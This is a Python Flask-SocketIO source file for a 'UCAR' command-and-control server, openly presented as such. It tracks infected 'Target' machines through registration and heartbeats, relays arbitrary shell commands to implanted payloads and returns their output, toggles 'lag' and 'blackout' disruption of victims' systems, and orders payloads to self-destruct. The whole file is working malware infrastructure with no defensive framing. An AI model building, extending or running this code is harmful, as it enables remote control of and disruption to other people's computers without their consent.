# UCAR System: Command & Control Server
# Author: Sigma

import os

# --- EVENTLET CONFIGURATION ---
# This must happen before other imports!
if __name__ == "__main__":
    import eventlet
    eventlet.monkey_patch()

from flask import Flask
from flask_socketio import SocketIO, emit, join_room
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

# --- Data Store ---
sessions = {}
blacklist = set()

@app.route('/')
def health_check():
    return "UCAR C2 Server is Operational", 200

def check_offline_sessions():
    """Background task to mark sessions as offline if they miss heartbeats."""
    while True:
        socketio.sleep(10)
        now = time.time()
        changed = False
        for sid, data in list(sessions.items()):
            if data['status'] == 'online' and now - data['last_seen'] > 30:
                sessions[sid]['status'] = 'offline'
                changed = True
        if changed:
            socketio.emit('session_list_update', sessions, namespace='/dashboard')

socketio.start_background_task(check_offline_sessions)

# --- Dashboard Namespace ---

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect():
    """Send current list to dashboard upon connection."""
    emit('session_list_update', sessions)

@socketio.on('execute_command', namespace='/dashboard')
def execute_command(data):
    """Relay CMD command to payload"""
    sid, command = data.get('session_id'), data.get('command')
    if sid in sessions:
        socketio.emit('run_command', {'command': command}, namespace='/payload', room=sid)

@socketio.on('update_lag_state', namespace='/dashboard')
def handle_lag(data):
    sid = data.get('session_id')
    status = data.get('status')
    intensity = data.get('intensity')
    if sid in sessions:
        sessions[sid]['lag_status'] = status
        sessions[sid]['lag_intensity'] = intensity
        socketio.emit('command_update_lag', data, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_blackout_state', namespace='/dashboard')
def handle_blackout(data):
    sid = data.get('session_id')
    status = data.get('status')
    if sid in sessions:
        sessions[sid]['blackout_status'] = status
        socketio.emit('command_blackout', {'status': status}, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('delete_session', namespace='/dashboard')
def delete_session(data):
    sid = data.get('session_id')
    if sid:
        print(f"Server: Issuing KILL to {sid}")
        blacklist.add(sid)
        socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
        if sid in sessions:
            del sessions[sid]
            emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_nametag', namespace='/dashboard')
def update_nametag(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['nametag'] = data.get('nametag')
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('clear_blacklist', namespace='/dashboard')
def clear_blacklist(data):
    print("Server: Clearing blacklist...")
    blacklist.clear()

# --- Payload Namespace ---

@socketio.on('command_result', namespace='/payload')
def command_result(data):
    """Relay CMD output back to dashboard"""
    sid = data.get('session_id')
    if sid in sessions:
        socketio.emit('command_output', data, namespace='/dashboard')

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    """Handle new connections from payloads."""
    sid = data.get('session_id')
    if not sid: return
    
    if sid in blacklist:
        join_room(sid)
        emit('command_self_destruct', {}, namespace='/payload', room=sid)
        return

    join_room(sid)
    
    # Check if this is a status change (offline -> online) or new
    is_new_status = False
    if sid in sessions:
        if sessions[sid]['status'] == 'offline':
            is_new_status = True
            sessions[sid]['status'] = 'online'
    else:
        is_new_status = True
        sessions[sid] = {
            'nametag': f'Target-{sid[:4]}', 
            'status': 'online', 
            'last_seen': time.time(), 
            'lag_status': 'off', 
            'lag_intensity': 5,
            'blackout_status': 'off'
        }
    
    sessions[sid]['last_seen'] = time.time()
    
    # Immediately notify dashboard if status changed
    if is_new_status:
        socketio.emit('session_list_update', sessions, namespace='/dashboard')
    
    # Sync states
    emit('command_update_lag', {'status': sessions[sid]['lag_status'], 'intensity': sessions[sid]['lag_intensity']}, namespace='/payload', room=sid)
    emit('command_blackout', {'status': sessions[sid]['blackout_status']}, namespace='/payload', room=sid)

@socketio.on('payload_heartbeat', namespace='/payload')
def heartbeat(data):
    sid = data.get('session_id')
    if sid in sessions:
        # If it was marked offline but is sending heartbeats, mark online immediately
        if sessions[sid]['status'] == 'offline':
            sessions[sid]['status'] = 'online'
            socketio.emit('session_list_update', sessions, namespace='/dashboard')
            
        sessions[sid]['last_seen'] = time.time()
    elif sid in blacklist:
        emit('command_self_destruct', {}, namespace='/payload', room=sid)

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5000)
